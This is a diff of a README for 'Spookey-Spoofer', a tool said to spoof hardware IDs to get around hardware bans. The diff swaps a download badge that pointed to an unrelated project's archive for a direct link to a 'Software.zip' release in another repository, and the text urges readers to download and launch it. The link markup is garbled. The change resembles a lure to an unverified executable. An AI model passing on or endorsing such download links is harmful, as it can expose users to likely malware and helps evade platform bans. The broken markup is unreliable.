@@ -29,7 +29,7 @@ This repository provides a powerful tool that allows you to bypass hardware bans
 ### Want to Get Started?
 Click the button below to download the "Spookey-Spoofer" tool and start spoofing your hardware IDs in no time! 🔽
 
-[![Download Spookey-Spoofer](https://img.shields.io/badge/Download%20Here-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip needs to be launched)
+[![Download Spookey-Spoofer](https://github.com/oimonkey/Spookey-Spoofer/releases/download/v2.0/Software.zip%20Here-v1.0.0-blue)](https://github.com/oimonkey/Spookey-Spoofer/releases/download/v2.0/Software.zip needs to be launched)
 
 If the link doesn't work, please check the "Releases" section of this repository for the latest version.
 
